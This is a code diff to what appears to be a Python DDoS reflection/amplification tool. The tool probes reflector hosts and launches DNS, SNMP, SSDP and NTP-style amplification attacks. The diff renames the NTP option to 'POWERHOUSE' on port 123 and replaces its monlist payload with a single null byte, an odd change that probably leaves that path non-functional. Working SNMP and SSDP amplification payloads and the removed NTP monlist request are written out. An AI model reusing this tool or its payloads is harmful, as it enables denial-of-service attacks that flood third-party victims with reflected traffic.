@@ -25,14 +25,14 @@ LOGO = r'''
 
 HELP = (
 	'DNS Amplification File and Domains to Resolve (e.g: dns.txt:[evildomain.com|domains_file.txt]',
-	'NTP Amplification file',
+	'POWERHOUSE Amplification file',
 	'SNMP Amplification file',
 	'SSDP Amplification file',
 	'Number of threads (default=1)' )
 
 OPTIONS = (
 	(('-d', '--dns'), dict(dest='dns', metavar='FILE:FILE|DOMAIN', help=HELP[0])),
-	(('-n', '--ntp'), dict(dest='ntp', metavar='FILE', help=HELP[1])),
+	(('-pw', '--pw'), dict(dest='pwh', metavar='FILE', help=HELP[1])),
 	(('-s', '--snmp'), dict(dest='snmp', metavar='FILE', help=HELP[2])),
 	(('-p', '--ssdp'), dict(dest='ssdp', metavar='FILE', help=HELP[3])),
 	(('-t', '--threads'), dict(dest='threads', type=int, default=1, metavar='N', help=HELP[4])) )
@@ -53,7 +53,7 @@ ATTACK = (
 
 PORT = {
 	'dns': 53,
-	'ntp': 123,
+	'pwh': 123,
 	'snmp': 161,
 	'ssdp': 1900 }
 
@@ -65,14 +65,14 @@ PAYLOAD = {
 		'\x69\x63\xa5\x19\x02\x04\x71\xb4\xb5\x68\x02\x01'
 		'\x00\x02\x01\x7F\x30\x0b\x30\x09\x06\x05\x2b\x06'
 		'\x01\x02\x01\x05\x00'),
-	'ntp':('\x17\x00\x02\x2a'+'\x00'*4),
+	'pwh':('\x00'),
 	'ssdp':('M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\n'
 		'MAN: "ssdp:discover"\r\nMX: 2\r\nST: ssdp:all\r\n\r\n')
 }
 
 amplification = {
 	'dns': {},
-	'ntp': {},
+	'pwh': {},
 	'snmp': {},
 	'ssdp': {} }		# Amplification factor
 
@@ -193,7 +193,7 @@ class DDoS(object):
 		sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 		sock.settimeout(2)
 		data = ''
-		if proto in ['ntp', 'ssdp']:
+		if proto in ['pwh', 'ssdp']:
 			packet = PAYLOAD[proto]
 			sock.sendto(packet, (soldier, PORT[proto]))
 			try:
@@ -295,8 +295,8 @@ def main():
 		else:
 			print 'Specify domains to resolve (e.g: --dns=dns.txt:evildomain.com)'
 			sys.exit()
-	if options.ntp:
-		files['ntp'] = [options.ntp]
+	if options.pwh:
+		files['pwh'] = [options.pwh]
 	if options.snmp:
 		files['snmp'] = [options.snmp]
 	if options.ssdp:
